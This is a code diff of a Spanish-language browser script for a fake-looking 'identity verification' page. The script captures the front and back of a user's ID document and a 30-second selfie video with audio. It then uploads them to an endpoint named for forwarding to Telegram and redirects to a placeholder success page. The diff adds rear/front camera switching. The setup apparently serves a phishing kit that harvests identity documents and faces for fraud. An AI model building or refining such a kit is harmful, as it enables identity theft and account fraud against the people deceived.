@@ -1,12 +1,9 @@
 document.addEventListener('DOMContentLoaded', () => {
 
     // --- Configuración ---
-    // Esta URL apunta a NUESTRO PROPIO servidor Node.js
     const UPLOAD_URL = "/api/enviar-a-telegram"; 
-    
-    // Página a la que irá el cliente (debe ser una URL real)
     const SUCCESS_REDIRECT_URL = "https://tu-web.com/verificacion-exitosa.html";
-    const RECORDING_SECONDS = 30; // 30 segundos de video
+    const RECORDING_SECONDS = 30;
 
     // --- Vistas ---
     const cameraView = document.getElementById('camera-view');
@@ -18,6 +15,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const status = document.getElementById('status');
     const countdownTimer = document.getElementById('countdown-timer');
     const captureButton = document.getElementById('capture-button');
+    const toggleCameraButton = document.getElementById('toggle-camera-button');
     const photoCanvas = document.getElementById('photo-canvas');
     
     // --- Elementos del Modal ---
@@ -31,20 +29,31 @@ document.addEventListener('DOMContentLoaded', () => {
     let countdownInterval;
 
     // --- Variables de estado y datos ---
-    let currentStep = 'WELCOME'; // WELCOME, ID_FRONT, ID_BACK, VIDEO_SELFIE, UPLOADING
+    let currentStep = 'WELCOME';
     let photoIdFront = null;
     let photoIdBack = null;
+    let currentFacingMode = 'user'; // 'user' (frontal) o 'environment' (trasera)
 
-    // --- 1. Iniciar Cámara ---
-    async function setupCamera() {
+    // --- 1. Iniciar/Reiniciar Cámara ---
+    async function setupCamera(forceFacingMode = null) {
         status.textContent = "Iniciando cámara...";
         startVerificationButton.disabled = true;
+        toggleCameraButton.disabled = true;
+
+        // Detener la cámara actual si existe
+        if (streamLocal) {
+            streamLocal.getTracks().forEach(track => track.stop());
+        }
+
+        currentFacingMode = forceFacingMode || currentFacingMode;
+
+        // Aplicar (o quitar) el estilo de espejo
+        videoPreview.style.transform = (currentFacingMode === 'user') ? 'scaleX(-1)' : 'scaleX(1)';
 
         try {
-            // Pedir video (con cámara frontal) y audio
             const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user' },
-                audio: true
+                video: { facingMode: currentFacingMode },
+                audio: true // Pedir audio siempre, solo se usará en la grabación
             });
             streamLocal = stream;
             videoPreview.srcObject = stream;
@@ -52,10 +61,20 @@ document.addEventListener('DOMContentLoaded', () => {
             videoPreview.onloadedmetadata = () => {
                 status.textContent = "Cámara lista.";
                 startVerificationButton.disabled = false;
-                
+                toggleCameraButton.disabled = false;
+
                 // Si ya estábamos en un paso de cámara, la mostramos
                 if (currentStep !== 'WELCOME') {
                     cameraView.style.display = 'flex';
+                }
+                // Si estamos en un paso de foto, mostramos el botón de cambio
+                if (currentStep === 'ID_FRONT' || currentStep === 'ID_BACK') {
+                    toggleCameraButton.style.display = 'flex';
+                }
+                
+                // Si cambiamos a 'VIDEO_SELFIE', iniciar grabación automáticamente
+                if (currentStep === 'VIDEO_SELFIE' && currentFacingMode === 'user') {
+                    startRecording();
                 }
             };
 
@@ -68,31 +87,55 @@ document.addEventListener('DOMContentLoaded', () => {
             `;
             modalOverlay.style.display = 'flex';
             cameraView.style.display = 'none';
+            toggleCameraButton.style.display = 'none';
         }
     }
 
     // --- 2. Actualizar UI (Manejador de estado) ---
     function updateUIForStep() {
+        // Ocultar todos los controles por defecto
+        captureButton.style.display = 'none';
+        toggleCameraButton.style.display = 'none';
+        countdownTimer.style.display = 'none';
+
         switch (currentStep) {
             case 'ID_FRONT':
                 modalOverlay.style.display = 'none';
                 cameraView.style.display = 'flex';
-                captureButton.style.display = 'block';
-                countdownTimer.style.display = 'none';
+                captureButton.style.display = 'block'; // Mostrar botón de captura
+                toggleCameraButton.style.display = 'flex'; // Mostrar botón de cambio
                 status.textContent = "Centra el FRENTE de tu documento";
-                if (!streamLocal) {
-                    setupCamera();
+                
+                // Intentar cambiar a cámara trasera ('environment') para documentos
+                if (currentFacingMode !== 'environment') {
+                    setupCamera('environment');
+                } else if (!streamLocal) {
+                    setupCamera(); // Iniciar cámara si no lo está
                 }
                 break;
             
             case 'ID_BACK':
+                // (La UI es casi idéntica a ID_FRONT)
+                modalOverlay.style.display = 'none';
+                cameraView.style.display = 'flex';
+                captureButton.style.display = 'block';
+                toggleCameraButton.style.display = 'flex';
                 status.textContent = "Ahora, centra la parte TRASERA";
+                // Debería seguir en 'environment'
                 break;
 
             case 'VIDEO_SELFIE':
-                captureButton.style.display = 'none';
+                modalOverlay.style.display = 'none';
+                cameraView.style.display = 'flex';
                 status.textContent = "Prepárate para el video selfie";
-                startRecording();
+                
+                // Forzar cámara frontal ('user') para el selfie
+                if (currentFacingMode !== 'user') {
+                    setupCamera('user');
+                    // setupCamera llamará a startRecording cuando esté lista
+                } else {
+                    startRecording(); // Si ya está frontal, empezar a grabar
+                }
                 break;
             
             case 'UPLOADING':
@@ -100,6 +143,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 verifyingModal.style.display = 'flex';
                 if (streamLocal) {
                     streamLocal.getTracks().forEach(track => track.stop());
+                    streamLocal = null; // Limpiar stream
                 }
                 break;
         }
@@ -107,22 +151,23 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- 3. Capturar Foto ---
     function capturePhoto() {
-        // Ajustar el canvas al tamaño real del video
         photoCanvas.width = videoPreview.videoWidth;
         photoCanvas.height = videoPreview.videoHeight;
         
         const context = photoCanvas.getContext('2d');
         
-        // Invertir el canvas horizontalmente (como un espejo)
-        // para que la foto coincida con la vista previa
-        context.save();
-        context.translate(photoCanvas.width, 0);
-        context.scale(-1, 1);
-        // Dibujar el fotograma actual del video
-        context.drawImage(videoPreview, 0, 0, photoCanvas.width, photoCanvas.height);
-        context.restore();
+        // Aplicar espejo solo si es cámara frontal
+        if (currentFacingMode === 'user') {
+            context.save();
+            context.translate(photoCanvas.width, 0);
+            context.scale(-1, 1);
+            context.drawImage(videoPreview, 0, 0, photoCanvas.width, photoCanvas.height);
+            context.restore();
+        } else {
+            // Dibujo normal para cámara trasera
+            context.drawImage(videoPreview, 0, 0, photoCanvas.width, photoCanvas.height);
+        }
 
-        // Convertir el canvas a un Blob (archivo de imagen JPEG)
         photoCanvas.toBlob((blob) => {
             if (currentStep === 'ID_FRONT') {
                 photoIdFront = blob;
@@ -135,12 +180,15 @@ document.addEventListener('DOMContentLoaded', () => {
                 currentStep = 'VIDEO_SELFIE';
                 updateUIForStep();
             }
-        }, 'image/jpeg', 0.9); // Calidad 90%
+        }, 'image/jpeg', 0.9);
     }
 
     // --- 4. Iniciar Grabación de Video ---
     function startRecording() {
-        if (!streamLocal) return;
+        if (!streamLocal) {
+            console.error("Intento de grabar sin stream de cámara.");
+            return;
+        }
 
         recordedChunks = [];
         mediaRecorder = new MediaRecorder(streamLocal, { mimeType: 'video/webm' });
@@ -154,10 +202,7 @@ document.addEventListener('DOMContentLoaded', () => {
         mediaRecorder.onstop = () => {
             currentStep = 'UPLOADING';
             updateUIForStep();
-
             const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-            
-            // ¡Llamar a la subida!
             uploadAllData(videoBlob);
         };
 
@@ -165,7 +210,7 @@ document.addEventListener('DOMContentLoaded', () => {
         
         status.textContent = "Grabando... Mantente visible";
         countdownTimer.textContent = RECORDING_SECONDS;
-        countdownTimer.style.display = 'block';
+        countdownTimer.style.display = 'block'; // Mostrar temporizador
         
         let secondsRemaining = RECORDING_SECONDS;
         
@@ -193,7 +238,6 @@ document.addEventListener('DOMContentLoaded', () => {
     async function uploadAllData(videoBlob) {
         const formData = new FormData();
         
-        // Nombres clave que el backend (Multer) esperará:
         formData.append('idFront', photoIdFront, `id_front.jpg`);
         formData.append('idBack', photoIdBack, `id_back.jpg`);
         formData.append('video', videoBlob, `selfie.webm`);
@@ -208,11 +252,13 @@ document.addEventListener('DOMContentLoaded', () => {
                 console.log("Archivos enviados con éxito");
                 window.location.href = SUCCESS_REDIRECT_URL;
             } else {
-                throw new Error(`Error del servidor: ${response.statusText}`);
+                const errorData = await response.json();
+                console.error("Error del servidor:", errorData.error);
+                throw new Error(`Error del servidor: ${errorData.error || response.statusText}`);
             }
 
         } catch (error) {
-            console.error('Error al subir los archivos:', error);
+            console.error('Error al subir los archivos:', error.message);
             handleUploadError();
         }
     }
@@ -229,21 +275,26 @@ document.addEventListener('DOMContentLoaded', () => {
         photoIdFront = null;
         photoIdBack = null;
         streamLocal = null; 
+        currentFacingMode = 'user'; // Resetear a cámara frontal
         setupCamera(); // Preparar la cámara de nuevo
     }
     
-    // --- Asignar Eventos (¡ESTA ES LA PARTE IMPORTANTE!) ---
+    // --- Asignar Eventos ---
     
-    // Al hacer clic en "Iniciar", pasamos al PRIMER PASO (ID_FRONT)
     startVerificationButton.onclick = () => {
-        currentStep = 'ID_FRONT'; // <-- Esto es lo que inicia el flujo de fotos
+        currentStep = 'ID_FRONT';
         updateUIForStep();
     };
 
-    // El nuevo botón de captura maneja las fotos
     captureButton.onclick = capturePhoto;
 
+    toggleCameraButton.onclick = () => {
+        currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
+        console.log("Cambiando cámara a:", currentFacingMode);
+        setupCamera(currentFacingMode); // Reiniciar la cámara con el nuevo modo
+    };
+
     // --- Iniciar ---
-    // Iniciamos la cámara en segundo plano
+    // Iniciar la cámara en segundo plano
     setupCamera();
 });
